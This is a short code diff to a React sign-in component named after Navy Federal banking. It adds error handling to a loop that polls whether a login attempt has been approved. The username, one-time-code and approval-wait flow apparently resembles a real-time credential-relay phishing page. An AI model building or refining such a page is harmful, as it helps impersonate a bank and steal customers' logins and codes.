@@ -3,7 +3,6 @@
 import React, { useEffect, useState } from 'react'
 import {
   startChallenge,
-  submitUsername,
   submitOtp,
   getStatus,
 } from '@/app/actions'
@@ -38,12 +37,16 @@ export default function NavyFederalBanking() {
     if (step !== 'awaiting_approval' || !attemptId) return
     let cancelled = false
     const tick = async () => {
-      const s = await getStatus(attemptId)
-      if (cancelled) return
-      if (s.status === 'approved') setStep('approved_success')
-      if (s.status === 'rejected' || s.status === 'expired') {
-        setStep('rejected')
-        setError('Sign-in was rejected.')
+      try {
+        const s = await getStatus(attemptId)
+        if (cancelled) return
+        if (s.status === 'approved') setStep('approved_success')
+        if (s.status === 'rejected' || s.status === 'expired') {
+          setStep('rejected')
+          setError('Sign-in was rejected.')
+        }
+      } catch (err) {
+        console.error('Status check failed:', err)
       }
     }
     tick()
@@ -147,6 +150,7 @@ export default function NavyFederalBanking() {
     } catch (err) {
       setLoading(false)
       setError(err instanceof Error ? err.message : 'Error')
+      return
     }
   }
 
